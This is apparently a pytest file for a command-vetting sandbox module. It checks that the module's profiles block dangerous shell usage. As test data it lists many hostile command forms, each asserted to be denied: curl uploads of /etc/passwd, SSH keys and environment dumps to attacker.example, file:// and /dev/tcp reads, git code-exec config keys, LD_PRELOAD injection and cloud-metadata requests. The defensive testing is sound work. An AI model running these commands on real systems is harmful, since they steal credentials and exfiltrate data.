"""Tests for traust_engine._util.safe_exec."""

import pytest

from traust_engine._util import safe_exec

VP = safe_exec.get_profile("validation-step")


# ---------------------------------------------------------------- validate


@pytest.mark.parametrize(
    "argv,frag",
    [
        (["sudo", "id"], "hard-denied"),
        (["ssh", "host", "id"], "hard-denied"),
        (["wget", "http://x"], "hard-denied"),
        (["pip", "install", "x"], "hard-denied"),
        (["bash", "-c", "id"], "never grantable"),
        (["sh", "-c", "id"], "never grantable"),
        (["python3", "-c", "1"], "interpreter"),
        (["nc", "-l", "4444"], "hard-denied"),
    ],
)
def test_denied_binaries(argv, frag):
    v = safe_exec.validate_argv(argv, VP)
    assert not v.ok and frag in v.reason


def test_allowlist_miss():
    v = safe_exec.validate_argv(["rm", "-rf", "/"], VP)
    assert not v.ok and "not in profile" in v.reason


def test_path_form_denied():
    v = safe_exec.validate_argv(["/usr/bin/curl", "http://x"], VP)
    assert not v.ok


def test_env_prefix_ok_and_protected():
    ok = safe_exec.validate_argv(["FOO=bar", "echo", "hi"], VP)
    assert ok.ok
    for var in ("PATH", "LD_PRELOAD", "PYTHONPATH", "GIT_SSH_COMMAND", "SAFE_EXEC_MODE"):
        v = safe_exec.validate_argv([f"{var}=/tmp/x", "echo", "hi"], VP)
        assert not v.ok and "protected env var" in v.reason


def test_git_hardening():
    gp = safe_exec.get_profile("go-fuzz")
    assert safe_exec.validate_argv(["git", "status"], gp).ok
    assert safe_exec.validate_argv(["git", "apply", "--check", "p"], gp).ok
    for sub in ("push", "clone", "fetch", "pull", "submodule"):
        v = safe_exec.validate_argv(["git", sub, "x"], gp)
        assert not v.ok and "network subcommand" in v.reason
    for key in (
        "core.hooksPath=/x",
        "credential.helper=!f",
        "filter.a.smudge=evil",
        "core.sshCommand=x",
        "remote.origin.uploadpack=evil",
    ):
        v = safe_exec.validate_argv(["git", "-c", key, "status"], gp)
        assert not v.ok and "code-exec/credential" in v.reason


def test_recursion_cap(monkeypatch):
    monkeypatch.setenv(safe_exec.RECURSION_ENV, str(safe_exec.MAX_RECURSION))
    v = safe_exec.validate_argv(["echo", "hi"], VP)
    assert not v.ok and "recursion" in v.reason


# ------------------------------------------------------------- string form


@pytest.mark.parametrize(
    "cmd,frag",
    [
        ("echo `id`", "backtick"),
        ("echo $(id)", "command substitution"),
        ("echo ${HOME}", "parameter expansion"),
        ("cat <(id)", "process substitution"),
        ("echo $'\\x41'", "ANSI-C"),
        ("cat /dev/tcp/h/80", "raw socket"),
        ("echo a; id", "shell operator"),
        ("echo a && id", "shell operator"),
        ("echo a > /etc/x", "shell operator"),
    ],
)
def test_string_raw_denies(cmd, frag):
    v = safe_exec.vet_command_string(cmd, VP)
    assert not v.ok and frag in v.reason


def test_string_pipeline_allowed():
    v = safe_exec.vet_command_string("oc get pods -A | grep -c Running", VP)
    assert v.ok and len(v.segments) == 2


def test_string_pipeline_denied_profile():
    gp = safe_exec.get_profile("generic-build")
    v = safe_exec.vet_command_string("make | grep ok", gp)
    assert not v.ok and "does not allow" in v.reason


def test_string_pipeline_bad_segment():
    v = safe_exec.vet_command_string("oc get pods | bash", VP)
    assert not v.ok


# ---------------------------------------------------------------- execute


def test_run_single(tmp_path):
    rc, out, _err = safe_exec.run(["echo", "hello"], "validation-step")
    assert rc == 0 and out.strip() == "hello"


def test_run_pipeline_no_shell():
    rc, out, _err = safe_exec.run("printf 'a\\nb\\nab\\n' | grep -c ab", "validation-step")
    assert rc == 0 and out.strip() == "1"


def test_run_blocked():
    rc, _out, err = safe_exec.run("echo hi; id", "validation-step")
    assert rc == 126 and "safe_exec blocked" in err


def test_run_env_scrubbed(monkeypatch):
    monkeypatch.setenv("SUPER_SECRET_TOKEN", "s3cr3t")
    rc, _out, _err = safe_exec.run(["printf", "%s", "x"], "validation-step")
    assert rc == 0
    # verify via a child that echoes env: use printf on the var — the
    # var must not survive scrubbing. printf doesn't expand env without
    # a shell, so probe with `env`-free approach: run `printenv`-less
    # check through grep of /proc is non-portable; instead assert the
    # scrub function itself drops it.
    env = safe_exec._scrubbed_env(VP)
    assert "SUPER_SECRET_TOKEN" not in env
    assert "PATH" in env


def test_extra_env_protected_refused():
    with pytest.raises(ValueError):
        safe_exec._scrubbed_env(VP, {"LD_PRELOAD": "/evil.so"})


def test_keep_env_scoped_to_heads(monkeypatch):
    """keep_env/extra_env reach only keep_env_heads segments,
    so text tools in a validated pipeline never see the token."""
    monkeypatch.setenv("VF_OAUTH_TOKEN", "s3cr3t-tok")
    env_curl = safe_exec._env_for_segment(("curl", "https://x"), VP, {"EXTRA": "e"})
    assert env_curl.get("VF_OAUTH_TOKEN") == "s3cr3t-tok" and env_curl.get("EXTRA") == "e"
    for seg in (("jq", "-n", "env"), ("cat", "/proc/self/environ"), ("FOO=bar", "grep", "x")):
        env = safe_exec._env_for_segment(seg, VP, {"EXTRA": "e"})
        assert "VF_OAUTH_TOKEN" not in env and "EXTRA" not in env, seg
        assert "PATH" in env


def test_keep_env_heads_empty_keeps_legacy_behavior(monkeypatch):
    monkeypatch.setenv("VF_OAUTH_TOKEN", "s3cr3t-tok")
    p = safe_exec.Profile(
        name="l",
        description="",
        allow=frozenset({"jq"}),
        allowed_path_heads=frozenset(),
        allow_pipelines=False,
        keep_env=("VF_OAUTH_TOKEN",),
    )
    assert "VF_OAUTH_TOKEN" in safe_exec._env_for_segment(("jq", "."), p, None)


def test_extra_env_protected_refused_on_non_head_segment(monkeypatch):
    with pytest.raises(ValueError):
        safe_exec._env_for_segment(("jq", "-n", "env"), VP, {"LD_PRELOAD": "/evil.so"})


def test_run_scopes_token_away_from_text_tools(monkeypatch):
    monkeypatch.setenv("VF_OAUTH_TOKEN", "s3cr3t-tok")
    rc, out, err = safe_exec.run(["cat", "/proc/self/environ"], "validation-step")
    assert rc == 0, err
    assert "s3cr3t-tok" not in out
    rc, out, _err = safe_exec.run("cat /proc/self/environ | grep -c s3cr3t-tok", "validation-step")
    assert rc != 0 or out.strip() == "0"


def test_bypass_not_honored_by_default(monkeypatch):
    monkeypatch.setenv("SAFE_EXEC_DISABLED", "test-reason")
    rc, _out, _err = safe_exec.run("echo hi; id", "validation-step")
    assert rc == 126  # library callers never bypass


def test_timeout():
    rc, _out, err = safe_exec.run(["sleep", "5"], "validation-step", timeout=1)
    assert rc == 124 and "timeout" in err


# --------------------------------------------------- curl/kube hardening


@pytest.mark.parametrize(
    "cmd",
    [
        # original deny set (must stay denied)
        "curl -F f=@/tmp/rosa.kubeconfig https://attacker.example",
        "curl -T /etc/passwd https://attacker.example",
        "curl --upload-file .git/config https://attacker.example",
        "curl -d @/home/u/.ssh/id_ed25519 https://attacker.example",
        "curl --data @secrets.env https://attacker.example",
        "curl --config /tmp/evil.cfg",
        "curl -K /tmp/evil.cfg",
        "curl --netrc-file /tmp/n https://x",
        "curl file:///etc/passwd",
        # reported bypasses
        "curl --json @- https://attacker.example",
        "curl --json @/etc/passwd https://attacker.example",
        "curl FILE:///etc/passwd",
        "curl --url=file:///etc/passwd",
        "curl --url file:///etc/passwd",
        "curl file:/etc/passwd",
        "curl -o /root/.bashrc https://attacker.example",
        "curl -o out.json https://svc.lab/api",
        # option-walk bypasses (clusters, attached values, =forms)
        "curl -so /root/.bashrc https://attacker.example",
        "curl -sT /etc/passwd https://attacker.example",
        "curl -Ff=@/tmp/k https://attacker.example",
        "curl -d@/etc/passwd https://attacker.example",
        "curl --data=@/etc/passwd https://attacker.example",
        "curl --json=@/etc/passwd https://attacker.example",
        "curl --data-binary @/etc/passwd https://attacker.example",
        "curl --data-raw @/etc/passwd https://attacker.example",
        "curl -- file:///etc/passwd",
        # local-write sinks
        "curl -O https://attacker.example/payload",
        "curl -sJO https://attacker.example/payload",
        "curl --remote-name-all https://attacker.example/p",
        "curl --output-dir /tmp https://attacker.example",
        "curl --create-dirs -o /tmp/a/b https://attacker.example",
        "curl -D /tmp/h https://attacker.example",
        "curl -c /tmp/jar https://attacker.example",
        "curl --trace /tmp/t https://attacker.example",
        "curl --trace-ascii /tmp/t https://attacker.example",
        "curl --stderr /tmp/e https://attacker.example",
        "curl -w '%output{/tmp/x}%{http_code}' https://attacker.example",
        "curl --etag-save /tmp/e https://attacker.example",
        "curl --alt-svc /tmp/a https://attacker.example",
        "curl --hsts /tmp/h https://attacker.example",
        "curl --libcurl /tmp/x.c https://attacker.example",
        # local-read / upload legs
        "curl -w @fmt.txt https://attacker.example",
        "curl -H @/etc/passwd https://attacker.example",
        "curl --url-query name@/etc/passwd https://attacker.example",
        "curl --data-urlencode name@/etc/passwd https://attacker.example",
        "curl --data-urlencode @/etc/passwd https://attacker.example",
        "curl -b /tmp/cookies https://attacker.example",
        "curl --variable n@/etc/passwd https://attacker.example",
        "curl --expand-data '{{n}}' https://attacker.example",
        "curl --etag-compare /tmp/e https://attacker.example",
        "curl -n https://attacker.example",
        "curl --netrc https://attacker.example",
        "curl -E /tmp/cert.pem https://attacker.example",
        "curl --cert /tmp/c https://attacker.example",
        "curl --key /tmp/k https://attacker.example",
        # proxy / resolution / protocol redirection
        "curl -x http://proxy:8080 https://x",
        "curl --proxy http://p https://x",
        "curl --proxy-header @/f https://x",
        "curl --socks5 h:1080 https://x",
        "curl --resolve h:443:1.2.3.4 https://x",
        "curl --connect-to a:443:b:443 https://x",
        "curl --unix-socket /var/run/d.sock http://x",
        "curl --abstract-unix-socket x http://x",
        "curl --location-trusted https://x",
        "curl --proto-default file x/etc/passwd",
        "curl --proto =all https://x",
        "curl --proto-redir =all https://x",
        "curl --doh-url https://d/dns-query https://x",
        "curl --interface eth1 https://x",
        # glob-expanded scheme/host smuggling (curl expands {}/[] before
        # URL parsing) — denied even with no host allowlist in force
        "curl {file}:///etc/passwd",
        "curl '{file,dict}:///etc/passwd'",
        "curl '[fF]ile:///etc/passwd'",
        "curl 'http://{svc.lab,evil.example}/x'",
        "curl 'https://evil[1-3].example/'",
        "curl --url '{file}:///etc/passwd'",
        # bracketed hosts that are not real IP literals (ipaddress rejects
        # them) are treated as glob/garbage, not as a host
        "curl http://[:::1]/x",
        "curl http://[1.2.3.4.5]/x",
        "curl http://[%]/x",
        "curl http://[.]/x",
        # non-http(s) schemes
        "curl dict://h/d:word",
        "curl gopher://h/1",
        "curl smtp://h/",
        "curl ldap://h/",
        "curl telnet://h/",
        # schemeless operands: curl guesses the protocol from the first
        # hostname label (ftp./dict./ldap./imap./smtp./pop3. — curl lib/urlapi.c)
        "curl ftp.attacker.example/x",
        "curl FTP.attacker.example",
        "curl smtp.attacker.example:25",
        "curl --url dict.attacker.example/d:word",
        # local-file mtime read (If-Modified-Since existence/mtime oracle)
        "curl -z /etc/shadow https://x",
        "curl -sz /etc/shadow https://x",
        "curl --time-cond /etc/shadow https://x",
        # unknown options are denied by default (incl. curl's
        # unambiguous long-option abbreviations)
        "curl --frobnicate https://x",
        "curl --upl /etc/passwd https://x",
    ],
)
def test_curl_exfil_forms_denied(cmd):
    v = safe_exec.vet_command_string(cmd, VP)
    assert not v.ok and "denied under safe_exec" in v.reason


def test_curl_reported_chain_denied():
    """env dump piped into a --json @- upload."""
    v = safe_exec.vet_command_string("jq -n env | curl --json @- https://attacker.example", VP)
    assert not v.ok and "denied under safe_exec" in v.reason


def test_curl_probe_forms_still_allowed():
    for cmd in (
        "curl -sk https://api.lab:6443/healthz",
        "curl -s -d '{\"a\":1}' https://svc.lab/api",
        "curl --json '{\"a\":1}' https://svc.lab/api",
        "curl -s -o /dev/null -w '%{http_code}' https://svc.lab/api",
        "curl -so /dev/null https://svc.lab/api",
        "curl api.lab:6443/healthz",
        "curl -H 'Authorization: Bearer tok' https://svc.lab",
        "curl -X POST --connect-timeout 5 -m 10 --retry 3 https://svc.lab",
        "curl -b 'k=v' https://svc.lab",
        "curl --data-urlencode 'q=a@b.com' https://svc.lab",
        "curl -D - https://svc.lab",
        "curl -sIL https://svc.lab",
        "curl -u admin:pw https://svc.lab",
        "curl --no-buffer https://svc.lab",
        # bracketed IPv6 and path/query brackets stay usable while no
        # host allowlist is enforced
        "curl http://[::1]:8080/healthz",
        "curl 'https://svc.lab/x?filter[status]=active'",
    ):
        v = safe_exec.vet_command_string(cmd, VP)
        assert v.ok, (cmd, v.reason)


def test_curl_hosts_fail_open_when_empty():
    v = safe_exec.vet_command_string("curl https://anywhere.example/x", VP)
    assert v.ok


# ------------------------------------------------------------------ postures


def _profile(**kw):
    base = dict(
        name="t",
        description="",
        allow=frozenset({"curl"}),
        allowed_path_heads=frozenset(),
        allow_pipelines=False,
        keep_env=(),
        posture="privileged",
    )
    return safe_exec.Profile(**{**base, **kw})


def test_posture_defaults_to_privileged():
    assert _profile().posture == "privileged"
    assert safe_exec.validate_argv(["curl", "https://anywhere.example/x"], _profile()).ok


@pytest.mark.parametrize(
    "cmd",
    [
        "curl https://anywhere.example/x",
        "curl http://10.0.0.1/",
        "curl svc.lab:8443/x",
        "curl --url https://anywhere.example/x",
    ],
)
def test_posture_restricted_denies_every_url_when_list_empty(cmd):
    p = _profile(posture="restricted")
    v = safe_exec.vet_command_string(cmd, p)
    assert not v.ok and "restricted" in v.reason


def test_posture_restricted_allows_listed_hosts():
    p = _profile(posture="restricted", curl_allowed_hosts=("svc.lab",))
    assert safe_exec.validate_argv(["curl", "https://svc.lab/x"], p).ok
    v = safe_exec.validate_argv(["curl", "https://evil.example/x"], p)
    assert not v.ok and "allowlist" in v.reason


def test_posture_restricted_satisfied_by_caller_hosts():
    """A restricted profile with an empty static list stays usable when the call
    site supplies ROE hosts, which is how ephemeral lab clusters are reached."""
    p = _profile(posture="restricted")
    assert safe_exec.validate_argv(
        ["curl", "https://api.ci-ln-x.lab.example:6443/healthz"],
        p,
        allowed_hosts=("api.ci-ln-x.lab.example",),
    ).ok
    assert not safe_exec.validate_argv(
        ["curl", "https://evil.example/x"], p, allowed_hosts=("api.ci-ln-x.lab.example",)
    ).ok


def test_bypass_recovers_pipeline_segments_under_restricted(monkeypatch):
    """SAFE_EXEC_DISABLED must still split a pipeline. Dropping allowed_hosts
    here made the vet fail under `restricted`, and the shlex fallback handed `|`
    to curl as an argument instead of piping."""
    monkeypatch.setenv("SAFE_EXEC_DISABLED", "test-reason")
    seen = []
    monkeypatch.setattr(
        safe_exec, "run_segments", lambda segs, *a, **k: seen.append(segs) or (0, "", "")
    )
    p = _profile(allow=frozenset({"curl", "jq"}), allow_pipelines=True, posture="restricted")
    safe_exec.run(
        "curl https://svc.lab/x | jq .items",
        "x",
        honor_bypass=True,
        profile_map={"x": p},
        allowed_hosts=("svc.lab",),
    )
    assert seen == [(("curl", "https://svc.lab/x"), ("jq", ".items"))]


def test_posture_restricted_does_not_affect_non_curl_binaries():
    p = _profile(allow=frozenset({"curl", "oc"}), posture="restricted")
    assert safe_exec.validate_argv(["oc", "get", "pods", "-n", "app"], p).ok


def _section(doc):
    from traust_contracts import SafeExecProfiles

    return SafeExecProfiles.model_validate(doc)


@pytest.mark.parametrize(
    "raw,canonical",
    [
        ("restricted", "restricted"),
        ("baseline", "baseline"),
        ("privileged", "privileged"),
        ("high", "restricted"),
        ("medium", "baseline"),
        ("low", "privileged"),
    ],
)
def test_posture_normalization_and_aliases(raw, canonical):
    pm = safe_exec._profiles_from_section(
        _section(
            {
                "version": 1,
                "profiles": {
                    "p": {"allow": ["curl"], "posture": raw},
                },
            }
        )
    )
    assert pm["p"].posture == canonical


def test_posture_file_default_and_profile_override():
    pm = safe_exec._profiles_from_section(
        _section(
            {
                "version": 1,
                "defaults": {"posture": "medium"},
                "profiles": {
                    "inherits": {"allow": ["curl"]},
                    "opts-out": {"allow": ["curl"], "posture": "high"},
                },
            }
        )
    )
    assert pm["inherits"].posture == "baseline"
    assert pm["opts-out"].posture == "restricted"


@pytest.mark.parametrize(
    "doc",
    [
        {"version": 1, "profiles": {"p": {"allow": ["curl"], "posture": "super-strict"}}},
        {"version": 1, "defaults": {"posture": "none"}, "profiles": {"p": {"allow": ["curl"]}}},
    ],
)
def test_posture_unknown_value_refused_at_load(doc):
    with pytest.raises(ValueError, match="posture"):
        safe_exec._profiles_from_section(_section(doc))


def test_posture_restricted_requires_keep_env_heads_with_pipelines():
    with pytest.raises(ValueError, match="keep_env_heads is required"):
        safe_exec._profiles_from_section(
            _section(
                {
                    "version": 1,
                    "profiles": {
                        "p": {
                            "allow": ["curl", "jq"],
                            "allow_pipelines": True,
                            "keep_env": ["MY_TOKEN"],
                            "posture": "restricted",
                        }
                    },
                }
            )
        )


def test_posture_baseline_allows_public_egress():
    p = _profile(posture="baseline")
    assert safe_exec.validate_argv(["curl", "https://example.com/api"], p).ok
    assert safe_exec.validate_argv(["curl", "https://api.github.com/repos"], p).ok


@pytest.mark.parametrize(
    "cmd,frag",
    [
        ("curl http://10.0.0.1/", "non-global IP"),
        ("curl http://172.16.5.10/", "non-global IP"),
        ("curl http://192.168.1.1/", "non-global IP"),
        ("curl http://127.0.0.1:8080/", "non-global IP"),
        ("curl http://127.0.1.1/", "non-global IP"),
        ("curl http://[::1]:8080/", "non-global IP"),
        ("curl http://[fc00::1]/", "non-global IP"),
        ("curl http://169.254.169.254/latest/meta-data/", "non-global IP"),
        ("curl http://localhost/x", "local/internal name"),
        ("curl http://metadata/x", "local/internal name"),
        ("curl http://app.local/", "internal domain"),
        ("curl http://service.internal/", "internal domain"),
        ("curl http://kubernetes.default.svc.cluster.local/", "internal domain"),
        ("curl http://myservice/healthz", "single-label host"),
    ],
)
def test_posture_baseline_denies_local_and_private_destinations(cmd, frag):
    p = _profile(posture="baseline")
    v = safe_exec.vet_command_string(cmd, p)
    assert not v.ok, f"expected failure for {cmd}"
    assert frag in v.reason


def test_posture_baseline_allows_explicit_allowlist_for_private_hosts():
    p = _profile(posture="baseline", curl_allowed_hosts=("10.0.0.1", "service.internal"))
    assert safe_exec.validate_argv(["curl", "http://10.0.0.1/api"], p).ok
    assert safe_exec.validate_argv(["curl", "http://service.internal/"], p).ok
    v = safe_exec.validate_argv(["curl", "http://10.0.0.2/api"], p)
    assert not v.ok and "allowlist" in v.reason
    # Public egress remains allowed when private exceptions are configured
    assert safe_exec.validate_argv(["curl", "https://example.com/api"], p).ok


def test_posture_baseline_denies_noncanonical_ip_and_svc():
    p = _profile(posture="baseline")
    assert not safe_exec.vet_command_string("curl http://127.1/x", p).ok
    assert not safe_exec.vet_command_string("curl http://my-service.namespace.svc/x", p).ok


def test_run_executes_env_prefix_and_injects_curl_disable():
    p = _profile(allow=frozenset({"echo", "curl"}))
    rc, out, _err = safe_exec.run(["FOO=bar", "echo", "hi"], "t", profile_map={"t": p})
    assert rc == 0
    assert out.strip() == "hi"

    cmd = safe_exec._prepare_exec_argv(["curl", "https://example.com/"])
    assert cmd == ["curl", "-q", "https://example.com/"]


@pytest.mark.parametrize("posture", ["baseline", "restricted"])
def test_postures_baseline_and_restricted_deny_redirects(posture):
    p = _profile(posture=posture)
    v1 = safe_exec.validate_argv(["curl", "-L", "https://example.com/"], p)
    assert not v1.ok and "redirect" in v1.reason
    v2 = safe_exec.validate_argv(["curl", "--location", "https://example.com/"], p)
    assert not v2.ok and "redirect" in v2.reason


@pytest.mark.parametrize(
    "cmd",
    [
        "curl https://svc.lab/x",
        "curl https://SVC.LAB/x",
        "curl https://svc.lab./x",
        "curl svc.lab:8443/x",
        "curl --url https://svc.lab/x",
        "curl --no-location https://svc.lab/x",
    ],
)
def test_curl_hosts_allowed(cmd):
    v = safe_exec.vet_command_string(cmd, VP, allowed_hosts=("svc.lab",))
    assert v.ok, v.reason


@pytest.mark.parametrize(
    "cmd,frag",
    [
        ("curl https://evil.example/x", "allowlist"),
        ("curl --url https://evil.example/x", "allowlist"),
        ("curl https://svc.lab@evil.example/", "userinfo"),
        ("curl 'https://{svc.lab,evil.example}/x'", "globbing"),
        # redirects would carry the request off the allowlist
        ("curl -L https://svc.lab/", "redirects"),
        ("curl -sIL https://svc.lab/", "redirects"),
        ("curl --location https://svc.lab/", "redirects"),
        ("curl 'https://svc.lab/x?a[]=1'", "globbing"),
    ],
)
def test_curl_hosts_denied(cmd, frag):
    v = safe_exec.vet_command_string(cmd, VP, allowed_hosts=("svc.lab",))
    assert not v.ok and frag in v.reason


def test_curl_hosts_profile_field_and_union():
    p = safe_exec.Profile(
        name="t",
        description="",
        allow=frozenset({"curl"}),
        allowed_path_heads=frozenset(),
        allow_pipelines=False,
        keep_env=(),
        curl_allowed_hosts=("svc.lab",),
    )
    assert safe_exec.validate_argv(["curl", "https://svc.lab/x"], p).ok
    assert not safe_exec.validate_argv(["curl", "https://evil.example/x"], p).ok
    v = safe_exec.validate_argv(["curl", "https://other.lab/x"], p, allowed_hosts=("other.lab",))
    assert v.ok, v.reason


@pytest.mark.parametrize("entry", ["internal:8443:oops", "a:b:c"])
def test_curl_hosts_unparseable_entries_refused_at_load(entry):
    """An entry that normalizes to '' must be refused, not dropped — an
    allowlist of only such entries would otherwise silently fail open."""
    from traust_contracts import SafeExecProfiles

    with pytest.raises(ValueError, match="normalize"):
        safe_exec._profiles_from_section(
            SafeExecProfiles.model_validate(
                {
                    "version": 1,
                    "profiles": {"p": {"allow": ["curl"], "curl_allowed_hosts": [entry]}},
                }
            )
        )


def test_curl_hosts_unparseable_kwarg_fails_closed():
    p = safe_exec.Profile(
        name="t",
        description="",
        allow=frozenset({"curl"}),
        allowed_path_heads=frozenset(),
        allow_pipelines=False,
        keep_env=(),
        curl_allowed_hosts=("internal:8443:oops",),
    )
    v = safe_exec.validate_argv(["curl", "https://attacker.example/x"], p)
    assert not v.ok and "normalize" in v.reason
    v = safe_exec.validate_argv(["curl", "https://x.lab/"], VP, allowed_hosts=("a:b:c",))
    assert not v.ok and "normalize" in v.reason


@pytest.mark.parametrize("entry", ["*.lab", "[fF]oo.lab", "svc.{a,b}.lab", "svc?.lab"])
def test_curl_hosts_glob_entries_refused_at_load(entry):
    from traust_contracts import SafeExecProfiles

    with pytest.raises(ValueError):
        safe_exec._profiles_from_section(
            SafeExecProfiles.model_validate(
                {
                    "version": 1,
                    "profiles": {"p": {"allow": ["curl"], "curl_allowed_hosts": [entry]}},
                }
            )
        )


@pytest.mark.parametrize(
    "entry,cmd",
    [
        # URL-shaped sources (cluster API URL, route URLs, port-forwards)
        # normalize to the bare hostname urlsplit() reports
        ("https://api.lab:6443", "curl https://api.lab:6443/x"),
        ("api.lab:6443", "curl https://api.lab/x"),
        ("https://user@API.LAB./path", "curl api.lab:8443/x"),
        ("[::1]:8080", "curl http://[::1]:8080/"),
        ("::1", "curl http://[::1]/"),
        ("[fe80::1%eth0]:80", "curl http://[fe80::1%eth0]/"),
        ("http://127.0.0.1:9090", "curl 127.0.0.1:9090/metrics"),
    ],
)
def test_curl_hosts_entries_normalized(entry, cmd):
    from traust_contracts import SafeExecProfiles

    v = safe_exec.vet_command_string(cmd, VP, allowed_hosts=(entry,))
    assert v.ok, v.reason
    pm = safe_exec._profiles_from_section(
        SafeExecProfiles.model_validate(
            {
                "version": 1,
                "profiles": {
                    "p": {"allow": ["curl"], "curl_allowed_hosts": [entry]},
                },
            }
        )
    )
    assert safe_exec.validate_argv(cmd.split(), pm["p"]).ok
    assert not safe_exec.validate_argv(["curl", "https://evil.example/"], pm["p"]).ok


def test_run_blocks_host_miss():
    rc, _out, err = safe_exec.run(
        ["curl", "https://evil.example/"], "validation-step", allowed_hosts=("svc.lab",)
    )
    assert rc == 126 and "allowlist" in err


@pytest.mark.parametrize(
    "cmd",
    [
        "oc --kubeconfig /home/u/.kube/hub delete ns x",
        "kubectl --context prod get secrets -A",
        "oc --token sha256~abc get pods",
        "kubectl --as system:admin delete pod x",
        "oc --server https://other:6443 get pods",
        "oc --insecure-skip-tls-verify get pods",
    ],
)
def test_kube_override_flags_denied(cmd):
    v = safe_exec.vet_command_string(cmd, VP)
    assert not v.ok and "denied under safe_exec" in v.reason


def test_kube_plain_forms_still_allowed():
    v = safe_exec.vet_command_string("oc get pods -n app -o json", VP)
    assert v.ok


# ------------------------------------------------------------------ config


def test_fallback_matches_config():
    """The embedded fallback for validation-step must equal the YAML on the
    grant surface. Curl host posture is excluded: a deployment may run
    validation-step closed while the fallback stays open."""
    from traust_contracts import load_section

    section = load_section("safe-exec-profiles.yaml", required=False)
    if section is None:
        pytest.skip("PyYAML or config unavailable")
    yaml_profiles = safe_exec._profiles_from_section(section)
    y = yaml_profiles["validation-step"]
    f = safe_exec._FALLBACK_PROFILES["validation-step"]
    assert y.allow == f.allow
    assert y.allow_pipelines == f.allow_pipelines
    assert set(y.keep_env) == set(f.keep_env)
    assert set(y.keep_env_heads) == set(f.keep_env_heads)


def test_fallback_profiles_are_fail_open():
    """A stripped checkout must not start denying every curl URL."""
    for profile in safe_exec._FALLBACK_PROFILES.values():
        assert profile.posture == "privileged"


def test_profiles_cannot_grant_hard_denies():
    from traust_contracts import SafeExecProfiles

    with pytest.raises(ValueError):
        safe_exec._profiles_from_section(
            SafeExecProfiles.model_validate(
                {"version": 1, "profiles": {"evil": {"allow": ["sudo"]}}}
            )
        )


def test_unknown_profile():
    with pytest.raises(KeyError):
        safe_exec.get_profile("nope")


# --------------------------------------------------------------------- CLI


def test_cli_check_block():
    assert safe_exec.check_command("validation-step", "echo hi; id") == 1


def test_cli_check_ok():
    assert safe_exec.check_command("validation-step", ["echo", "hi"]) == 0


def test_cli_check_allowed_hosts():
    assert (
        safe_exec.check_command(
            "validation-step", "curl https://evil.example/", allowed_hosts=("svc.lab",)
        )
        == 1
    )
    assert (
        safe_exec.check_command(
            "validation-step", "curl https://svc.lab/", allowed_hosts=("svc.lab",)
        )
        == 0
    )


def test_cli_warn_mode(monkeypatch, capsys):
    monkeypatch.setenv("SAFE_EXEC_MODE", "warn")
    assert safe_exec.check_command("validation-step", "echo hi; id") == 0
    assert "would block" in capsys.readouterr().out
